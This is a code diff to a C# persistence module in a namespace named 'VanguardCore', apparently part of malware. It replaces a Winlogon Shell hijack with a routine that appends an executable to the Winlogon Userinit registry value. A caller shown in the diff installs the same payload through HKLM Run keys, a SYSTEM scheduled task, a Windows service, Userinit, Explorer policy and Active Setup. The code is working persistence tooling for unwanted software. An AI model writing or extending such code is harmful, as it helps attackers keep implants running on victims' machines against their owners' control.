@@ -505,8 +505,8 @@ namespace VanguardCore
         }
         #endregion
 
-        #region Метод 12: Winlogon Shell Hijack (ADMIN REQUIRED)
-        public static bool InstallShellHijack(string path)
+        #region Метод 12: Winlogon Userinit (ADMIN REQUIRED)
+        public static bool InstallUserinit(string path)
         {
             if (!IsAdmin()) return false;
             try
@@ -516,10 +516,12 @@ namespace VanguardCore
                 {
                     if (k != null)
                     {
-                        string currentShell = k.GetValue("Shell", "explorer.exe").ToString();
-                        if (!currentShell.ToLower().Contains(path.ToLower()))
+                        object val = k.GetValue("Userinit");
+                        string current = val != null ? val.ToString() : null;
+                        if (!string.IsNullOrEmpty(current) && !current.ToLower().Contains(path.ToLower()))
                         {
-                            k.SetValue("Shell", currentShell + "," + path);
+                            // Userinit is comma-separated list of executables
+                            k.SetValue("Userinit", current.TrimEnd(',') + "," + path + ",");
                             return true;
                         }
                     }
@@ -614,7 +616,7 @@ namespace VanguardCore
                 InstallRegistryRun(name, path, true); // HKLM
                 InstallTask(name + "Svc", path, true); // Admin Task (SYSTEM)
                 InstallService(name, path); // Windows Service
-                InstallShellHijack(path); // Winlogon Shell
+                InstallUserinit(path); // Winlogon Userinit
                 InstallExplorerPolicy(path, true); // HKLM Policy
                 InstallActiveSetup(path, true); // HKLM Active Setup
             }
